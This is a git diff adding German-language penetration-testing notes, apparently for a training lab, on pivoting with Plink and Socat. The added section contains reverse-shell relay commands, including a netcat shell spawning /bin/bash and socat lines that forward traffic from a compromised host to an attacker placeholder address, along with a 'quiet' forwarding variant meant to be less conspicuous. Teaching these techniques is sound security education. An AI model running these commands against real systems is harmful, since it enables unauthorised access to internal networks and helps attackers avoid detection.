@@ -226,3 +226,105 @@ Du hast Zugriff auf den Server 172.16.0.50, auf dem intern ein Webserver auf Por
 
 >ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
 
+### Plink.exe
+
+Plink ist eine CMD Version des beliebten PuTTy SSH Clients. Da Windows aber mittlerweile in seinen Versionen einen eigenen SSh Client hat, ist Plink nicht mehr ganz so relevant.
+
+Generell ist es nicht besonders üblich das Windows Server auch einen SSH Client laufen haben. Unsere Verwendung von Plink besteht in der Regel darin, eine Binary zum Ziel zu transportieren und sie dann zum Erstellen einer reverse Shell zu verwenden.
+
+Beachte das diese Syntax nahezu identisch mit der vorherigen ist, wenn du den Standard-OpenSSH-Client verwendest. Das cmd.exe /c echo y am Anfang ist für nicht interaktive Shells (wie die meisten Reverse-Shells – wobei Windows-Shells schwer zu stabilisieren sind) gedacht, um die Warnmeldung zu umgehen, dass das Ziel keine Verbindung zu diesem Host in der Vergangenheit hergestellt hat.
+
+
+Wir müssen allerdings daran denken, dass der Key den wir mit ss-keygen erstellt haben in diesem Fall nicht funktioniert. Wir müssen diesen nämlich umwandeln mit dem puttygen Tool das wir mit folgendem Befehl installieren können:
+
+>sudo apt install putty-tools. After downloading the tool, conversion can be done with:
+puttygen KEYFILE -o OUTPUT_KEY.ppk
+
+Wir müssen natürlich entsprechend unsere Werte eintragen.
+
+Die dabei erstellte .ppk Datein wird dann auf das Windows System übertragen wie bereits schon in dem vorherigen Kapitel. (Trotz der Konvertierung des privaten Schlüssels funktioniert er immer noch einwandfrei mit demselben öffentlichen Schlüssel, den wir zuvor zur Datei „authorized_keys“ hinzugefügt haben)
+
+### Socat
+
+Socat ist nicht nur gut für stabile Linux Shells, es ist auch perfekt fürs Port Forwarding. Das große Minus ist allerdings (mal abgesehen von der sehr schwer zu verstehenden Syntax) dass es sehr selten auf einem System installiert ist. 
+Die Binarys für Linux und Windows findet man [hier](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) und [hier](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download)
+
+Socat kann für verschlüsselte Verbindungen verwendet werden sowohl fürs PortForwarding als auch Relays. Das würde allerdings zu komplex werden, daher müsstest du dich damit anderweitig beschäftigen. 
+
+Man kann mit Socat jetzt keinen kompletten Proxy ins Netwerk bringen, allerdings wie bereits gesagt, Port Forwarding für Linux und Windows realisieren. Im Grunde ist Socat perfekt für ein Relay. Zum Beispiel wenn wir eine Shell auf einem Ziel haben möchten, das Ziel aber keine Verbindung zu uns zurück aufbauen kann, können wir mit Socat ein Relay auf dem bereits kompromettierten System erstellen. Dieses Relay wartet auf eine Reverse Shell von dem Zielsystem und leitet diese dann an uns weiter. 
+
+![alt text](image-5.png)
+
+---
+**Reverse Shell Relay mit Socat**
+
+Dann erstellen wir mal ein Relay, dass ne Rev Shell zu uns weiterleitet. 
+
+Wir starten auf unserem System einen Netcat Listener auf Port 443
+
+>sudo nc -lvnp 443
+
+Danach starten wir auf dem gehackten System das Socat Relay mit:
+
+>socat tcp-l:8000 tcp:Unsere-IP:443 &
+
+Okay was passiert hier? Das Relay hört auf dem Port 8000. Wenn was reinkommt, leitet es dies weiter an unsere Maschine auf Port 443. Das &-Zeichen lässt das ganze im Hintergrund verschwinden, sodass wir weiter die Shell nutzen können.
+
+Wir können das easy simulieren, wenn wir einfach auf dem System eine Netcat Verbindung loopbacken auf Port 8000.
+
+>nc 127.0.0.1 8000 -e /bin/bash
+
+Jetzt haben wir im Prinzip das gemacht, was oben auf dem Bild zu sehen ist.
+
+---
+**Port Forwarding mit Socat - Easy**
+
+Der schnellste und einfachste Weg ein Port Forwarding zu realisieren ist das öffnen eines Listener Ports auf dem gehackten System und alles was durch diesen Port reinkommt an das Zielsystem weiterzuleiten.
+
+Wenn der kompromittierte Server beispielsweise 172.16.0.5 ist und das Ziel Port 3306 von 172.16.0.10 ist, könnten wir den folgenden Befehl (auf dem kompromittierten Server) verwenden, um eine Portweiterleitung zu erstellen:
+
+>./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
+
+Dadurch wird Port 33060 auf dem kompromittierten Server geöffnet und die Eingaben von der angreifenden Maschine direkt auf den vorgesehenen Zielserver umgeleitet, was uns im Wesentlichen Zugriff auf die (vermutlich MySQL-Datenbank) verschafft, die auf unserem Ziel 172.16.0.10 läuft. Die fork-Option wird verwendet, um jede Verbindung in einen neuen Prozess zu stellen, und die reuseaddr-Option bedeutet, dass der Port offen bleibt, nachdem eine Verbindung zu ihm hergestellt wurde. In Kombination ermöglichen sie es uns, denselben Port für mehr als eine Verbindung weiterzuleiten. Erneut verwenden wir &, um die Shell im Hintergrund zu betreiben, sodass wir weiterhin dieselbe Terminalsitzung auf dem kompromittierten Server für andere Dinge verwenden können.
+
+Wir können jetzt eine Verbindung zu Port 33060 auf dem Relay (172.16.0.5) herstellen und unsere Verbindung direkt an unser beabsichtigtes Ziel 172.16.0.10:3306 weiterleiten lassen.
+---
+**Port Forwarding mit Socat - Quiet**
+
+Die Easy Methode ist zwar schnell und leicht, aber sie öffnet nunmal einen Port auf dem Host, daher ist es eventuell auffällig. Daher gibt es noch eine andere Möglichkeit die nur minimal schwieriger ist:
+
+Wir führen auf unserer Angreifer Maschine folgendes aus:
+
+>socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+
+Dadurch werden zwei Ports geöffnet: 8000 und 8001, wodurch ein lokales Port-Relay entsteht. Was in das eine hineingeht, kommt auch aus dem anderen wieder heraus. Aus diesem Grund sind für Port 8000 auch die Optionen fork und reuseaddr festgelegt, damit wir über diesen Port Forward mehr als eine Verbindung erstellen können.
+
+Auf dem gehackten System führen wir folgendes aus:
+
+>socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
+
+Dadurch wird eine Verbindung zwischen unserem Listener Port 8001 auf dem angreifenden Computer und dem offenen Port des Zielservers hergestellt. Um das fiktive Netzwerk von zuvor zu verwenden, könnten wir diesen Befehl wie folgt eingeben:
+
+>socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
+
+Dadurch würde eine Verbindung zwischen Port 8000 auf unserem angreifenden Computer und Port 80 auf dem beabsichtigten Ziel (172.16.0.10) hergestellt, was bedeutet, dass wir im Webbrowser unseres angreifenden Computers zu localhost:8000 gehen könnten, um die vom Ziel bereitgestellte Webseite zu laden: 172.16.0.10:80!
+
+Die Visualisierung dieses Szenarios ist recht komplex. Sehen wir uns also kurz an, was passiert, wenn Sie versuchen, in Ihrem Browser auf die Webseite zuzugreifen:
+
+Die Anfrage geht an 127.0.0.1:8000
+Aufgrund des Socat-Listeners, den wir auf unserem eigenen Computer gestartet haben, kommt alles, was in Port 8000 geht, aus Port 8001 heraus
+Port 8001 ist direkt mit dem Socat-Prozess verbunden, den wir auf dem kompromittierten Server ausgeführt haben. Das bedeutet, dass alles, was von Port 8001 kommt, an den kompromittierten Server gesendet wird, wo es an Port 80 auf dem Zielserver weitergeleitet wird.
+
+Der Vorgang wird dann umgekehrt, wenn das Ziel die Antwort sendet:
+
+Die Antwort wird an den Socat-Prozess auf dem kompromittierten Server gesendet. Was in den Prozess einfließt, kommt auf der anderen Seite heraus, die zufällig direkt mit Port 8001 auf unserem angreifenden Rechner verbunden wird.
+Alles, was in Port 8001 auf unserem angreifenden Computer eingeht, kommt über Port 8000 auf unserem angreifenden Computer, wo der Webbrowser seine Antwort erwartet, sodass die Seite empfangen und gerendert wird.
+
+Wir haben jetzt das Gleiche wie zuvor erreicht, jedoch ohne Ports auf dem Server zu öffnen. Cool oder?
+
+Wie schließen wir das ganze wieder? Die Lösung ist einfach: Führen Sie den Befehl **jobs** in Ihrem Terminal aus und beenden Sie dann alle Socat-Prozesse mit kill %NUMBER:
+![alt text](image-6.png)
+
+Empfehlenswert wäre hier der [Shell](https://tryhackme.com/r/room/introtoshells)-Room.
+
+### Chisel
